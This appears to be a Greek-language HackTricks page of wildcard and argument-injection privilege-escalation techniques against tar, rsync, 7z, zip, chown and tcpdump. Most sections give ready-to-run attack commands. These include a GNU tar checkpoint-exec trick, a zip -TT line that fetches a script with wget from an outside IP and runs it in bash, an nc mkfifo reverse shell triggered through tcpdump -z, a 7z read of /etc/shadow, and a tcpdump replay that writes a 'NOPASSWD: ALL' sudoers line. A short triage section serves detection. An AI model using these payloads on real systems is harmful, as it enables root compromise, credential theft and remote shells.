# Επιπλέον τεχνάσματα με wildcards

{{#include ../../banners/hacktricks-training.md}}

> Η **εισαγωγή ορισμάτων** μέσω wildcard (γνωστή και ως *glob*) συμβαίνει όταν ένα προνομιούχο script εκτελεί ένα δυαδικό αρχείο Unix όπως τα `tar`, `chown`, `rsync`, `zip`, `7z`, … με ένα wildcard χωρίς εισαγωγικά, όπως το `*`.  
> Επειδή το shell επεκτείνει το wildcard **πριν** εκτελέσει το δυαδικό αρχείο, ένας επιτιθέμενος που μπορεί να δημιουργήσει αρχεία στον κατάλογο εργασίας μπορεί να φτιάξει ονόματα αρχείων που αρχίζουν με `-`, ώστε να ερμηνεύονται ως **επιλογές αντί για δεδομένα**, εισάγοντας ουσιαστικά αυθαίρετες σημαίες ή ακόμη και εντολές.<sup>[[6]](#references)</sup>
> Σε αυτήν τη σελίδα συγκεντρώνονται οι πιο χρήσιμες τεχνικές, πρόσφατες έρευνες και σύγχρονες μέθοδοι ανίχνευσης για την περίοδο 2023-2025.

## chown / chmod

Μπορείτε να **αντιγράψετε τον ιδιοκτήτη/την ομάδα ή τα δικαιώματα από ένα αρχείο αναφοράς**, καταχρώμενοι τη σημαία `--reference` όταν ένα όνομα αρχείου που μοιάζει με επιλογή επεκτείνεται από wildcard.<sup>[[6]](#references)[[8]](#references)[[9]](#references)</sup>

```bash
# attacker-controlled directory
touch -- .drf.php
chmod 777 -- .drf.php
touch -- "--reference=.drf.php"   # ← filename becomes an argument
```

Όταν ο root εκτελέσει αργότερα κάτι όπως:

```bash
chown -R alice:alice *.php
chmod -R 644 *.php
```

Το expanded `--reference=.drf.php` υπερισχύει του ρητού owner/mode, με αποτέλεσμα τα αρχεία που ταιριάζουν να κληρονομούν τα metadata από το `.drf.php` (και, με την παραπάνω ρύθμιση, να είναι εγγράψιμα από τον attacker).<sup>[[6]](#references)</sup>

Ελέγξτε ολόκληρο το privileged helper, όχι μόνο τη γραμμή `chown`. Μια αλλαγή ownership μπορεί να αφαιρέσει τα set-user-ID ή set-group-ID bits· [το POSIX αφήνει την privileged περίπτωση να καθορίζεται από την υλοποίηση](https://pubs.opengroup.org/onlinepubs/9699919799.2013edition/functions/chown.html). Ένα μεταγενέστερο `chmod` στην ίδια εργασία μπορεί να επαναφέρει αυτά τα bits σε αρχεία που είχε επιλέξει νωρίτερα, αλλάζοντας το αποτέλεσμα. Επιβεβαιώστε την πραγματική σειρά των εντολών, τον εγγράψιμο κατάλογο του glob, τη συμπεριφορά για το επηρεαζόμενο αρχείο και τους συνδέσμους, τον owner και το mode που προκύπτουν, καθώς και αν το mount τηρεί τα set-user-ID bits, προτού θεωρήσετε ότι πρόκειται για διαδρομή εκτέλεσης με αναβαθμισμένα δικαιώματα. Αν το helper δεν είναι αναγνώσιμο, αυτά τα βήματα παραμένουν άγνωστα.

*PoC & tool*: [`wildpwn`](https://github.com/localh0t/wildpwn) (combined attack).<sup>[[7]](#references)</sup>
Δείτε επίσης την κλασική εργασία της DefenseCode για λεπτομέρειες.<sup>[[6]](#references)</sup>

---

## GNU `cp` σε privileged script

Ελέγξτε ένα script που εκτελείται ως root και αντιγράφει από τον κατάλογο εργασίας που έχει επιλέξει ο caller, χρησιμοποιώντας ένα απλό glob, όπως `cp .version * /etc/app/staged/`, όταν ένας χρήστης με χαμηλότερα δικαιώματα μπορεί να δημιουργεί filenames εκεί. Το GNU `cp` μπορεί να ερμηνεύσει ως option ένα filename που αρχίζει με παύλα και έχει προκύψει από το `*`. Η επιλογή `--preserve=mode` μπορεί να διατηρήσει τα source mode bits σε ένα νέο αντίγραφο, ενώ η `--target-directory` μπορεί να αλλάξει τον προορισμό της αντιγραφής. Για να επαληθευτεί οποιοδήποτε από αυτά τα αποτελέσματα, πρέπει να ελεγχθούν το ακριβές branch του script, η κατάσταση του προορισμού, τα effective privileges, η πολιτική του filesystem και η συμπεριφορά του GNU `cp`· το κείμενο ενός sudo rule ή script από μόνο του δεν αποδεικνύει privilege escalation. Η προσθήκη `./` πριν από τα operands ή ο τερματισμός της ανάλυσης των options με `--` αποτρέπει αυτήν την ερμηνεία filename που αρχίζει με παύλα από το GNU `cp` ([GNU Coreutils FAQ](https://www.gnu.org/software/coreutils/faq/coreutils-faq.html), [`cp` manual](https://www.gnu.org/software/coreutils/manual/html_node/cp-invocation.html)).

---

## tar

### GNU tar

Εκτελέστε αυθαίρετες εντολές καταχρώμενοι τη δυνατότητα **checkpoint** του GNU tar και τις checkpoint actions.<sup>[[10]](#references)</sup>

```bash
# attacker-controlled directory
echo 'echo pwned > /tmp/pwn' > shell.sh
chmod +x shell.sh
touch -- "--checkpoint=1"
touch -- "--checkpoint-action=exec=sh shell.sh"
```

Μόλις το root εκτελέσει π.χ. `tar -czf /root/backup.tgz *`, το `shell.sh` εκτελείται ως root.<sup>[[10]](#references)</sup>

### bsdtar / macOS: προειδοποίηση για την παράκαμψη του compressor

Το προεπιλεγμένο `tar` στις πρόσφατες εκδόσεις του macOS (που βασίζεται στο `libarchive`) δεν παρέχει τη διεπαφή `--checkpoint` του GNU tar, αλλά το bsdtar τεκμηριώνει την επιλογή **--use-compress-program** για την επιλογή εξωτερικού compressor.<sup>[[11]](#references)</sup>

```bash
# macOS example
touch -- "--use-compress-program=sh"
```
Όταν ένα privileged script εκτελεί `tar -cf backup.tar *`, επιλέγεται το `sh` μέσω του `PATH` του θύματος και το bsdtar το εκκινεί ως compressor.<sup>[[11]](#references)</sup> Αυτό αποδεικνύει option injection, αλλά από μόνο του δεν αποτελεί αξιόπιστο arbitrary-command primitive: ένα filename που δημιουργείται από wildcard δεν μπορεί να περιέχει `/`, ενώ το bsdtar παρέχει δεδομένα αρχειοθέτησης και όχι μια εντολή shell που έχει επιλέξει ο attacker. Για την εκτέλεση κώδικα απαιτείται επιπλέον ένα ελεγχόμενο εκτελέσιμο που εντοπίζεται μέσω του `PATH` ή ένα άλλο κανάλι ορισμάτων μέσω του οποίου μπορεί να δοθεί ένα χρήσιμο πρόγραμμα.

---

## rsync

Το `rsync` σάς επιτρέπει να παρακάμψετε το remote shell ή το remote binary μέσω flags γραμμής εντολών, όπως τα `-e` και `--rsync-path`.<sup>[[12]](#references)</sup>

```bash
# attacker-controlled directory
touch -- "-e sh shell.sh"        # -e <cmd> => use <cmd> instead of ssh
```

Αν αργότερα το root αρχειοθετήσει τον κατάλογο με `rsync -az * backup:/srv/`, το injected flag μπορεί να εκτελέσει ένα shell μέσω του μηχανισμού remote-shell.<sup>[[7]](#references)[[12]](#references)</sup>

*PoC*: [`wildpwn`](https://github.com/localh0t/wildpwn) (λειτουργία `rsync`).

---

## 7-Zip / 7z / 7za

Ακόμα κι όταν το privileged script προσθέτει *αμυντικά* το `--` πριν από το wildcard (για να σταματήσει την ανάλυση των options), το CLI του 7-Zip δέχεται **αρχεία λίστας αρχείων** αν το όνομα του αρχείου έχει μπροστά το `@`. Συνδυάζοντάς το με ένα symlink, μπορείτε να κάνετε *exfiltrate αυθαίρετα αρχεία*.<sup>[[13]](#references)</sup>

```bash
# directory writable by low-priv user
cd /path/controlled
ln -s /etc/shadow   root.txt      # file we want to read
touch @root.txt                  # tells 7z to use root.txt as file list
```

Αν ο root εκτελέσει κάτι όπως:

```bash
7za a /backup/`date +%F`.7z -t7z -snl -- *
```

Το 7-Zip θα προσπαθήσει να διαβάσει το `root.txt` (→ `/etc/shadow`) ως λίστα αρχείων και θα τερματίσει, **εκτυπώνοντας τα περιεχόμενα στο stderr**.<sup>[[13]](#references)</sup>

Αυτό λειτουργεί ακόμα και με `-- *`, επειδή το CLI του 7-Zip δέχεται ρητά τόσο κανονικά ονόματα αρχείων όσο και `@listfiles` ως ορίσματα θέσης. Έτσι, ένα κυριολεκτικό όνομα αρχείου όπως το `@root.txt` εξακολουθεί να αντιμετωπίζεται με ειδικό τρόπο.<sup>[[13]](#references)</sup>

---

## zip

Υπάρχουν δύο πολύ πρακτικές primitive τεχνικές όταν μια εφαρμογή περνά ελεγχόμενα από τον χρήστη ονόματα αρχείων στο `zip` (είτε μέσω wildcard είτε απαριθμώντας ονόματα χωρίς `--`).<sup>[[2]](#references)[[3]](#references)</sup>

- RCE μέσω test hook: Το `-T` ενεργοποιεί το «test archive» και το `-TT <cmd>` αντικαθιστά το πρόγραμμα ελέγχου με ένα αυθαίρετο πρόγραμμα (πλήρης μορφή: `--unzip-command <cmd>`). Αν μπορείτε να εισαγάγετε ονόματα αρχείων που αρχίζουν με `-`, χωρίστε τα flags σε διακριτά ονόματα αρχείων, ώστε να λειτουργήσει η ανάλυση των short options.<sup>[[2]](#references)[[3]](#references)</sup>

```bash
# Attacker-controlled filenames (e.g., in an upload directory)
# 1) A file literally named: -T
# 2) A file named: -TT wget 10.10.14.17 -O s.sh; bash s.sh; echo x
# 3) Any benign file to include (e.g., data.pcap)
# When the privileged code runs: zip out.zip <files...>
# zip will execute: wget 10.10.14.17 -O s.sh; bash s.sh; echo x
```

Σημειώσεις
- ΜΗΝ δοκιμάσετε ένα μόνο όνομα αρχείου όπως `'-T -TT <cmd>'` — οι σύντομες επιλογές αναλύονται ανά χαρακτήρα και αυτό θα αποτύχει. Χρησιμοποιήστε ξεχωριστά tokens, όπως φαίνεται.<sup>[[3]](#references)</sup>
- Αν η εφαρμογή αφαιρεί τις κάθετες από τα ονόματα αρχείων, κάντε λήψη από έναν σκέτο host/IP (προεπιλεγμένη διαδρομή `/index.html`) και αποθηκεύστε τοπικά με `-O`, έπειτα εκτελέστε το.<sup>[[3]](#references)</sup>
- Μπορείτε να αποσφαλματώσετε την ανάλυση με το `-sc` (εμφάνιση των argv μετά την επεξεργασία) ή το `-h2` (περισσότερη βοήθεια), για να κατανοήσετε πώς χρησιμοποιούνται τα tokens σας.<sup>[[3]](#references)</sup>

Παράδειγμα (τοπική συμπεριφορά στο zip 3.0).<sup>[[3]](#references)</sup>

```bash
zip test.zip -T '-TT wget 10.10.14.17/shell.sh' test.pcap    # fails to parse
zip test.zip -T '-TT wget 10.10.14.17 -O s.sh; bash s.sh' test.pcap  # runs wget + bash
```

- Data exfil/leak: Αν το web layer εμφανίζει το `stdout/stderr` του `zip` (συνηθισμένο με αφελείς wrappers), injected flags όπως το `--help` ή σφάλματα από μη έγκυρες επιλογές θα εμφανιστούν στην HTTP απόκριση, επιβεβαιώνοντας command-line injection και βοηθώντας στη ρύθμιση του payload.<sup>[[3]](#references)</sup>

---

## Πρόσθετα υποψήφια σημεία για option injection

Όταν ένας προνομιούχος wrapper επεκτείνει έναν εγγράψιμο κατάλογο με wildcard, αξίζει να ελεγχθούν τα τεκμηριωμένα hooks επιλογών.<sup>[[15]](#references)[[16]](#references)[[17]](#references)</sup>

| Binary | Flag προς κατάχρηση | Επίδραση |
| --- | --- | --- |
| `flock` | `-c <cmd>` | Περνά μια συμβολοσειρά εντολής σε ένα shell |
| `git`   | `-c core.sshCommand=<cmd>` | Χρησιμοποιεί το `<cmd>` αντί για SSH για Git fetch/push |
| `scp`   | `-S <program>` | Χρησιμοποιεί εναλλακτικό πρόγραμμα σύνδεσης συμβατό με SSH |

Αυτά τα primitives είναι χρήσιμα για ελέγχους πέρα από τις κλασικές περιπτώσεις *tar/rsync/zip*.

---

## Εντοπισμός ευάλωτων wrappers και jobs

Πρόσφατες μελέτες περιπτώσεων και οδηγίες ανίχνευσης δείχνουν ότι το wildcard/argv injection δεν είναι πλέον μόνο πρόβλημα **cron + tar**.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup> Η ίδια κατηγορία σφάλματος εξακολουθεί να εμφανίζεται σε:

- λειτουργίες web που «κατεβάζουν τα πάντα ως zip/tar» από καταλόγους μεταφορτώσεων που ελέγχονται από τον επιτιθέμενο
- κελύφη αποσφαλμάτωσης προμηθευτών/συσκευών που εκθέτουν έναν wrapper του **tcpdump** με πεδία ονόματος αρχείου/φίλτρου που ελέγχονται από τον επιτιθέμενο
- εργασίες backup ή rotation που καλούν `tar`, `rsync`, `7z`, `zip`, `chown` ή `chmod` σε εγγράψιμους καταλόγους

Χρήσιμες εντολές για αρχική διαλογή (η κλήση του `pspy` χρησιμοποιεί τα τεκμηριωμένα flags για συμβάντα διεργασιών/αρχείων και για το χρονικό διάστημα).<sup>[[14]](#references)</sup>

```bash
# Hunt for interesting binaries fed with globs or positional user data
rg -n --hidden --follow \
  '(tar|bsdtar|rsync|zip|7z|7za|chown|chmod|tcpdump).*(\*|\$@|\$\*)' \
  /etc /opt /usr/local /srv 2>/dev/null

# Watch real argv during cron/systemd execution
pspy64 -pf -i 1000 | rg 'tar|rsync|zip|7z|tcpdump|chown|chmod'

# Sudoers rules that constrain one argument but still allow extra flags
sudo -l
rg -n 'tcpdump|zip|tar|rsync' /etc/sudoers /etc/sudoers.d 2>/dev/null
```

Ευρεστικοί κανόνες:

- Το `-- *` είναι καλή λύση για πολλά εργαλεία GNU, αλλά **όχι** για τα `7z`/`7za`, επειδή τα `@listfiles` αναλύονται ξεχωριστά.<sup>[[13]](#references)</sup>
- Για το `zip`, αναζητήστε wrappers που απαριθμούν απευθείας ονόματα αρχείων τα οποία ελέγχει ο χρήστης· το short-option splitting (`-T` + `-TT <cmd>`) εξακολουθεί να λειτουργεί ακόμη κι αν δεν υπάρχει shell glob.<sup>[[2]](#references)[[3]](#references)</sup>
- Για το `tcpdump`, δώστε ιδιαίτερη προσοχή σε wrappers που σας επιτρέπουν να ελέγχετε **ονόματα αρχείων εξόδου**, **ρυθμίσεις εναλλαγής αρχείων** ή ορίσματα **αναπαραγωγής αρχείου καταγραφής πακέτων**.<sup>[[18]](#references)</sup>

---

## tcpdump rotation hooks (-G/-W/-z): RCE μέσω argv injection σε wrappers

Όταν ένα restricted shell ή ένας vendor wrapper δημιουργεί τη γραμμή εντολών του `tcpdump` συνενώνοντας πεδία που ελέγχει ο χρήστης (π.χ. μια παράμετρο «όνομα αρχείου»), χωρίς αυστηρό quoting/validation, μπορείτε να παρεισφρήσετε πρόσθετα flags του `tcpdump`. Ο συνδυασμός των `-G` (εναλλαγή αρχείων βάσει χρόνου), `-W` (περιορισμός του αριθμού των αρχείων) και `-z <cmd>` (εντολή μετά την εναλλαγή αρχείου) επιτρέπει την αυθαίρετη εκτέλεση εντολών ως ο χρήστης που εκτελεί το tcpdump (συχνά ως root σε συσκευές).<sup>[[1]](#references)[[4]](#references)[[18]](#references)</sup>

Προϋποθέσεις:

- Μπορείτε να επηρεάσετε το `argv` που περνά στο `tcpdump` (π.χ. μέσω ενός wrapper όπως το `/debug/tcpdump --filter=... --file-name=<HERE>`).<sup>[[4]](#references)[[18]](#references)</sup>
- Ο wrapper δεν καθαρίζει τα κενά ή τα tokens του πεδίου ονόματος αρχείου που αρχίζουν με `-`.<sup>[[4]](#references)</sup>

Κλασικό PoC (εκτελεί ένα script reverse shell από διαδρομή με δικαίωμα εγγραφής).<sup>[[4]](#references)[[18]](#references)</sup>

```sh
# Reverse shell payload saved on the device (e.g., USB, tmpfs)
cat > /mnt/disk1_1/rce.sh <<'EOF'
#!/bin/sh
rm -f /tmp/f; mknod /tmp/f p; cat /tmp/f|/bin/sh -i 2>&1|nc 192.0.2.10 4444 >/tmp/f
EOF
chmod +x /mnt/disk1_1/rce.sh

# Inject additional tcpdump flags via the unsafe "file name" field
/debug/tcpdump --filter="udp port 1234" \
  --file-name="test -i any -W 1 -G 1 -z /mnt/disk1_1/rce.sh"

# On the attacker host
nc -6 -lvnp 4444 &
# Then send any packet that matches the BPF to force a rotation
printf x | nc -u -6 [victim_ipv6] 1234
```

Λεπτομέρειες:

- Το `-G 1` κάνει εναλλαγή κάθε δευτερόλεπτο και το `-W 1` σταματά μετά από ένα αρχείο εναλλαγής· η καταγραφή πρέπει να λάβει ένα αντίστοιχο πακέτο πριν από την εναλλαγή.<sup>[[18]](#references)</sup>
- Το `-z <cmd>` εκτελεί την εντολή post-rotate μία φορά ανά εναλλαγή και περνά τη διαδρομή του κλειστού savefile ως όρισμα· βεβαιωθείτε ότι ο χειρισμός ορισμάτων του script/interpreter ταιριάζει με το payload σας.<sup>[[18]](#references)</sup>

Παραλλαγές χωρίς αφαιρούμενα μέσα:

- Αν έχετε οποιοδήποτε άλλο primitive για εγγραφή αρχείων (π.χ. ένα ξεχωριστό command wrapper που επιτρέπει ανακατεύθυνση εξόδου), τοποθετήστε το script σας σε γνωστή διαδρομή και ενεργοποιήστε το `-z /path/script.sh`· αν χρειάζεται, κάντε το script να εκτελεί το `/bin/sh` απευθείας.<sup>[[18]](#references)</sup>
- Αν ένα vendor wrapper σάς επιτρέπει να επιλέξετε τη διαδρομή του αρχείου εναλλαγής, ελέγξτε αυτόν τον έλεγχο διαδρομής μόνο σε συνδυασμό με μια εντολή post-rotate που ερμηνεύει το όρισμα savefile· ο έλεγχος διαδρομής από μόνος του δεν εκτελεί τα περιεχόμενα του αρχείου.<sup>[[18]](#references)</sup>

---

## sudoers: tcpdump με wildcards/επιπλέον ορίσματα → αυθαίρετη εγγραφή/ανάγνωση και root

Παράδειγμα anti-pattern sudoers:<sup>[[3]](#references)</sup>

```text
(ALL : ALL) NOPASSWD: /usr/bin/tcpdump -c10 -w/var/cache/captures/*/<GUID-PATTERN> -F/var/cache/captures/filter.<GUID-PATTERN>
```

Ο κανόνας αφήνει διαθέσιμες αρκετές επιλογές στον τεκμηριωμένο parser του tcpdump:<sup>[[3]](#references)[[18]](#references)</sup>
- Το glob `*` και τα permissive patterns περιορίζουν μόνο το πρώτο όρισμα `-w`. Το `tcpdump` δέχεται πολλές επιλογές `-w`· υπερισχύει η τελευταία.<sup>[[3]](#references)[[18]](#references)</sup>
- Ο κανόνας δεν περιορίζει άλλες επιλογές, επομένως επιτρέπονται οι `-Z`, `-r`, `-V` κ.λπ.<sup>[[3]](#references)[[18]](#references)</sup>

Οι σχετικές primitives τεκμηριώνονται παρακάτω.<sup>[[3]](#references)[[18]](#references)</sup>
- Παράκαμψη της διαδρομής προορισμού με δεύτερη επιλογή `-w` (η πρώτη απλώς ικανοποιεί το sudoers).<sup>[[3]](#references)[[18]](#references)</sup>

```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ \
  -w /dev/shm/out.pcap \
  -F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```

- Path traversal μέσα στο πρώτο `-w` για να διαφύγετε από το περιορισμένο δέντρο.<sup>[[3]](#references)</sup>

```bash
sudo tcpdump -c10 \
  -w/var/cache/captures/a/../../../../dev/shm/out \
  -F/var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```

- Επιβάλετε την ιδιοκτησία των αρχείων εξόδου με `-Z root` (δημιουργεί αρχεία με ιδιοκτήτη root οπουδήποτε).<sup>[[3]](#references)[[18]](#references)</sup>

```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
  -w /dev/shm/root-owned \
  -F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```

- Εγγραφή αυθαίρετου περιεχομένου με επανάληψη ενός ειδικά διαμορφωμένου PCAP μέσω `-r` (π.χ. για προσθήκη μιας γραμμής sudoers).<sup>[[3]](#references)[[18]](#references)</sup>

<details>
<summary>Δημιουργήστε ένα PCAP που περιέχει το ακριβές ASCII payload και γράψτε το ως root</summary>

```bash
# On attacker box: craft a UDP packet stream that carries the target line
printf '\n\nfritz ALL=(ALL:ALL) NOPASSWD: ALL\n' > sudoers
sudo tcpdump -w sudoers.pcap -c10 -i lo -A udp port 9001 &
cat sudoers | nc -u 127.0.0.1 9001; kill %1

# On victim (sudoers rule allows tcpdump as above)
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
  -r sudoers.pcap -w /etc/sudoers.d/1111-aaaa \
  -F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```

</details>

- Ανάγνωση αυθαίρετου αρχείου/secret leak με `-V <file>` (ερμηνεύει μια λίστα savefiles). Τα διαγνωστικά σφάλματος συχνά επαναλαμβάνουν γραμμές, προκαλώντας leak περιεχομένου.<sup>[[3]](#references)[[18]](#references)</sup>

```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -V /root/root.txt \
  -w /tmp/dummy \
  -F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```

---

## References

- [1] [GTFOBins - tcpdump](https://gtfobins.github.io/gtfobins/tcpdump/)
- [2] [GTFOBins - zip](https://gtfobins.github.io/gtfobins/zip/)
- [3] [0xdf - HTB Dump: Εισαγωγή argument στο zip για RCE + λανθασμένη ρύθμιση sudo στο tcpdump για privesc](https://0xdf.gitlab.io/2025/11/04/htb-dump.html)
- [4] [FiberGateway GR241AG - Πλήρης αλυσίδα exploit](https://r0ny.net/FiberGateway-GR241AG-Full-Exploit-Chain/)
- [5] [Elastic - Εντοπίστηκε πιθανό Shell μέσω Wildcard Injection](https://www.elastic.co/guide/en/security/current/prebuilt-rule-8-19-20-potential-shell-via-wildcard-injection-detected.html)
- [6] [Επιστροφή στο μέλλον: Τα Unix wildcards εκτός ελέγχου (DefenseCode)](https://www.exploit-db.com/papers/33930)
- [7] [wildpwn](https://github.com/localh0t/wildpwn)
- [8] [GNU Coreutils - κλήση `chown`](https://www.gnu.org/software/coreutils/manual/html_node/chown-invocation.html)
- [9] [GNU Coreutils - κλήση `chmod`](https://www.gnu.org/software/coreutils/manual/html_node/chmod-invocation.html)
- [10] [GNU tar checkpoints](https://www.gnu.org/software/tar/manual/html_section/checkpoints.html)
- [11] [Εγχειρίδιο bsdtar(1)](https://man.freebsd.org/cgi/man.cgi?query=bsdtar&sektion=1)
- [12] [Εγχειρίδιο rsync(1)](https://download.samba.org/pub/rsync/rsync.1)
- [13] [Σύνταξη γραμμής εντολών 7-Zip](https://7-zip.opensource.jp/chm/cmdline/syntax.htm)
- [14] [pspy](https://github.com/DominicBreuker/pspy)
- [15] [Εγχειρίδιο flock(1)](https://kernel.googlesource.com/pub/scm/utils/util-linux/util-linux/+/refs/tags/v2.41.1/sys-utils/flock.1.adoc)
- [16] [Τεκμηρίωση ρυθμίσεων Git](https://git-scm.com/docs/git-config)
- [17] [Εγχειρίδιο OpenBSD `scp`](https://man.openbsd.org/scp)
- [18] [Εγχειρίδιο tcpdump(8)](https://man7.org/linux/man-pages/man8/tcpdump.8.html)
{{#include ../../banners/hacktricks-training.md}}
